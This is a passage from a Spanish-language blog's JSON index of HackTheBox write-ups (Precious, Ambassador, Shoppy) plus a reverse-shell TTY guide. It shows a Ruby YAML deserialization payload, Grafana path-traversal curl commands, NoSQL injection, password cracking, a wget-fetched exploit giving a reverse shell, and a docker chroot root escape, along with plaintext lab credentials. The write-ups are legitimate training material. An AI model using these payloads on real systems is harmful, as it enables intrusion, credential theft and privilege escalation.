usuarioruby@precious:~$ ssh henry@10.10.11.189The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.189' (ECDSA) to the list of known hosts.henry@10.10.11.189's password: Q3c1AqGHtoI0aXAYFH Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103henry@precious:~$ Procedemos a leer la flag del usuariohenry@precious:~$ cat user.txt 67****************************bchenry@precious:~$ Escalada de PrivilegiosViendo por permisos SUDO nos encontramos con estehenry@precious:~$ sudo -lMatching Defaults entries for henry on precious:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser henry may run the following commands on precious:    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rbSi leemos ese archivo vemos que intenta cargar el archivo “dependencies.yml”, si buscamos por internet nos encontramos con este blog y este repositorio de GitHub, nos creamos un archi con este contenido.---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: \"abc\"      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: id         method_id: :resolveCambiamos el id por:  chmod +s /bin/bashCon esto nuestra BASH sera SUID---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: \"abc\"      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: chmod +s /bin/bash         method_id: :resolveEjecutamos el comandohenry@precious:~$ sudo ruby /opt/update_dependencies.rb henry@precious:~$ ls -l /bin/bash-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bashhenry@precious:~$ Ahora podemos lanzarnos la bash como root y leemos la flag de roothenry@precious:~$ bash -pbash-5.1# whoami &amp;&amp; idrootuid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)bash-5.1# bash-5.1# cat /root/root.txt 85****************************f4bash-5.1# Acabamos de comprometer la máquina, Buena suerte."
  },
  
  {
    "title": "Ambassador WriteUp",
    "url": "/posts/ambassador-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, grafana, directory transversal, arbitrary file read, medium",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicare cómo comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con una vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de Consul con un token que nos lanzará la shell como root.Escaneo NMAPEmpezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04Initiating SYN Stealth Scan at 00:03Scanning 10.10.11.183 [65535 ports]Discovered open port 80/tcp on 10.10.11.183Discovered open port 3306/tcp on 10.10.11.183Discovered open port 22/tcp on 10.10.11.183Discovered open port 3000/tcp on 10.10.11.183Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports)Nmap scan report for 10.10.11.183Host is up, received user-set (0.32s latency).Scanned at 2023-01-21 00:03:39 -04 for 17sNot shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 633000/tcp open  ppp     syn-ack ttl 633306/tcp open  mysql   syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 17.22 seconds           Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB)Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administradorEnumeraciónPodemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encontramos y tratar de acceder a él.Viendo la web nos encontramos con esto:Grafana LoginViendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de que cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File ReadSearchsploitPodemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd❯ searchsploit -m multiple/webapps/50581.py  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read      URL: https://www.exploit-db.com/exploits/50581     Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py    Codes: CVE-2021-43798 Verified: FalseFile Type: Python script, ASCII text executableCopied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.pyLo ejecutamos…SearchsploitBuscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual.❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashdeveloper:x:1000:1000:developer:/home/developer:/bin/bashSi seguimos leyendo podemos ver que nos podemos descargar la base de datos curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.dbAhora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil.  sudo apt install sqlite3Sigueindo las instrucciones del blog leemos la base de datos. sqlite3 grafana.bdUna vez detro de la base de datos, procedemos a leer las tablas ❯ sqlite3 grafana.dbSQLite version 3.34.1 2021-01-20 14:10:07Enter \".help\" for usage hints.sqlite&gt; .tablesalert                       login_attempt             alert_configuration         migration_log             alert_instance              ngalert_configuration     alert_notification          org                       alert_notification_state    org_user                  alert_rule                  playlist                  alert_rule_tag              playlist_item             alert_rule_version          plugin_setting            annotation                  preferences               annotation_tag              quota                     api_key                     server_lock               cache_data                  session                   dashboard                   short_url                 dashboard_acl               star                      dashboard_provisioning      tag                       dashboard_snapshot          team                      dashboard_tag               team_member               dashboard_version           temp_user                 data_source                 test_data                 kv_store                    user                      library_element             user_auth                 library_element_connection  user_auth_token           sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source.select * from data_source;Veremos algo cómo esto.sqlite&gt; SELECT * FROM data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4zsqlite&gt; Ganamos accesoDonde el parámetro -h corresponde al host -u  al user -p a la contraseñaAhora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña.❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 47Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| grafana            || information_schema || mysql              || performance_schema || sys                || whackywidget       |+--------------------+6 rows in set (0,172 sec)MySQL [(none)]&gt; use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]&gt; show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users                  |+------------------------+1 row in set (0,396 sec)MySQL [whackywidget]&gt; SELECT * FROM users;+-----------+------------------------------------------+| user      | pass                                     |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+1 row in set (0,375 sec)MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera.echo \"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==\" | base64 -d;echo anEnglishManInNewYork027468Con esas credenciales podemos conectarnos por SSH.❯ ssh developer@10.10.11.183The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.183' (ECDSA) to the list of known hosts.developer@10.10.11.183's password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat 21 Jan 2023 05:10:23 AM UTC  System load:  0.0               Processes:             229  Usage of /:   84.4% of 5.07GB   Users logged in:       0  Memory usage: 49%               IPv4 address for eth0: 10.10.11.183  Swap usage:   0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jan 21 00:27:29 2023 from 10.10.14.105developer@ambassador:~$ export TERM=xtermdeveloper@ambassador:~$ Podemos leer la primara flag.developer@ambassador:~$ cat user.txt 565**************************1b5developer@ambassador:~$ Enumeración del sistemaEn la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github.developer@ambassador:~$ ls -a.  ..  .bash_history  .bash_logout  .bashrc  .cache.gitconfig  .gnupg  .lesshst  .local  .profile  .ssh  snap  user.txtdeveloper@ambassador:~$ Si lo leemos nos dice la ruta donde se encuentra.developer@ambassador:~$ cat .gitconfig [user]    name = Developer    email = developer@ambassador.local[safe]    directory = /opt/my-appdeveloper@ambassador:~$ Si nos situamos en la carpeta /opt podemos ver el proyecto github.developer@ambassador:/opt/my-app$ ls -a.  ..  .git  .gitignore  env  whackywidgetdeveloper@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicarondeveloper@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:44:45 2022 +0000    config scriptcommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:47:01 2022 +0000    created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:44:11 2022 +0000    .gitignoredeveloper@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit.developer@ambassador:/opt/my-app$ git showcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptdiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex 35c08f6..fc51ec0 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD before running+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORDdeveloper@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios.Escalada de privilegiosUsando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub**, nos montamos un servidor **HTTP con Pythonpython -m http.server 80En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.developer@ambassador:~$ wget http://10.10.14.61/exploit.py--2023-01-21 05:40:22--  http://10.10.14.61/exploit.pyConnecting to 10.10.14.61:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1409 (1.4K) [text/x-python]Saving to: ‘exploit.py.1’exploit.py.1                                  100%[=================================================================================================&gt;]   1.38K  --.-KB/s    in 0s      2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409]developer@ambassador:~$ En la máquina víctima ejecutamos lo siguiente.Nota: Recuerda cambiar tu IP de HTBEn nuestra máquina host nos ponemos en escuchadeveloper@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 ❯ nc -nlvp 123listening on [any] 123 ...Al ejecutarlo nos debe llegar la shell como root❯ nc -nlvp 123listening on [any] 123 ...connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732bash: cannot set terminal process group (3731): Inappropriate ioctl for devicebash: no job control in this shellroot@ambassador:/# Ahora podemos vizualizar la flag como rootroot@ambassador:~# lscleanup.sh  root.txt  snaproot@ambassador:~# cat root.txt 5a4**************************4b1root@ambassador:~# "
  },
  
  {
    "title": "Shoppy WriteUp",
    "url": "/posts/shoppy-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, no sql, docker, easy, virtual hosting",
    "date": "2023-01-13 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker.Escaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04Initiating SYN Stealth Scan at 11:59Scanning 10.10.11.180 [65535 ports]Discovered open port 80/tcp on 10.10.11.180Discovered open port 22/tcp on 10.10.11.180Discovered open port 9093/tcp on 10.10.11.180Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports)Nmap scan report for 10.10.11.180Host is up, received user-set (0.16s latency).Scanned at 2023-01-15 11:59:53 -04 for 16sNot shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 639093/tcp open  copycat syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.33 seconds           Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.180       shoppy.htb\" | tee -a /etc/hostsAhora debemos ver una web con una cuenta regresiva, nada importanteEnumeraciónEnumerando directorios con WFUZZ nos encontramos lo siguiente.Nota: Debes tener clonado el repositorio de SecList❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://shoppy.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000053:   200        25 L     62 W       1074 Ch     \"login\"                                                                                                                000000016:   301        10 L     16 W       179 Ch      \"images\"                                                                                                               000000291:   301        10 L     16 W       179 Ch      \"assets\"                                                                                                               000000259:   302        0 L      4 W        28 Ch       \"admin\"   Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque.Login ShoppyIntroducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.Login ShoppyPodemos seguir probando tipicas SQL injection, pero al final ninguna funcionará.''-- -' or '1'='1' or '1'='1'-- -Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y  este otro blog No SQl injection.Podemos probar admin'||'1==1 y poner cualquier contraseña:Bypass LoginBingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con johnecho \"admin:23c6877d9e2b564ef8b32c3a23de27b2\" &gt; hashesecho \"josh:6ebcea65320589ca4f2f1ce039975995\" &gt;&gt; hashes❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5Using default input encoding: UTF-8Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=8Press 'q' or Ctrl-C to abort, almost any other key for statusremembermethisway (josh)1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..*7¡Vamos!Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliablySession completedTenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:          http://shoppy.htb/[+] Method:       GET[+] Threads:      200[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt[+] User Agent:   gobuster/3.1.0[+] Timeout:      10s===============================================================2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode===============================================================Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]Progress: 52985 / 100001 (52.98%)    Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts.Al entrar en el web nos encontramos con estoLogin MattermostViendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos.Information leaked❯ ssh jaeger@10.10.11.180jaeger@10.10.11.180's password: Sh0ppyBest@pp!Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26manpath: can't set the locale; make sure $LC_* and $LANG are correctjaeger@shoppy:~$ export TERM=xtermjaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable.Enumeración del sistemajaeger@shoppy:~$ sudo -l[sudo] password for jaeger: Sh0ppyBest@pp!Matching Defaults entries for jaeger on shoppy:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy:    (deploy) /home/deploy/password-managerjaeger@shoppy:~$ Intentamos ejecutar el comandojaeger@shoppy:~$ sudo -u deploy /home/deploy/passw*Welcome to Josh password manager!Please enter your master password: PasswordAccess denied! This incident will be reported !jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deployPassword-Managerjaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !Deploy Creds :username: deploypassword: Deploying@pp!jaeger@shoppy:~$ Podemos migrar al usuario Deploy .jaeger@shoppy:~$ su deployPassword: Deploying@pp!$ bashdeploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)deploy@shoppy:/home/jaeger$ Escalada de privilegiosPertenecemos al grupo docker  mirando GtfObins podemos ver que podemos abusar del grupo dockerEjecutamos el comando nos da una shell como root. deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bashroot@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67root@3ea87a82734f:~# "
  },
  
  {
    "title": "Tratamiento de la TTY",
    "url": "/posts/tty/",
    "categories": "pentesting, machine",
    "tags": "tty",
    "date": "2022-02-03 17:00:00 +0100",
    





    "snippet": "Una vez que ganamos acceso a un servidor por medio de una reverse shell no será interactiva al 100%, para solucionar estó debemos aplicar un tratamiento a la TTY, al aplicar este tratamiento podemos hacer Ctrl + C sin miedo a perder la Shell y tambien limpiar la pantalla y tabular para el autocompletado.Tratamientoroot@f5fd61010b2d:~$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullroot@f5fd61010b2d:~$ Presionamos Ctrl + Z para suspender la shellroot@f5fd61010b2d:~$ ^Zzsh: suspended  nc -lvnp 444Reiniciamos la shell y configuramos el tipo de terminal❯ stty raw -echo; fg❯ stty raw -echo; fg[1]  + continued  nc -lvnp 444                              reset xtermYa podemos aplicar Ctrl + C y no perderemos la conexión, pero el Ctrl + L no funciona, para ello cambiamos la variable de entorno TERM a xtermroot@f5fd61010b2d:~$ export TERM=xtermA veces la variable SHELL vale nologin, hacemos lo siguiente para que sea una shellroot@f5fd61010b2d:~$ export SHELL=/bin/bashYa tenemos una consola semi-interactiva, para que sea full-interactiva debemos cambiar las filas y columnas, en la mæquina victima hacemos un:root@f5fd61010b2d:~$ stty size24 80root@f5fd61010b2d:~$ Y en nuestra máquina hacemos lo mismo y confirmamos que los valores no coinciden.❯ stty size48 184Regresamos a la máquina victima y cambiamos los valoresroot@f5fd61010b2d:~$ stty rows 48 columns 184        root@f5fd61010b2d:~$ Una vez hecho esto nuestra TTY ya sera 100% interactiva."
  }
  
]

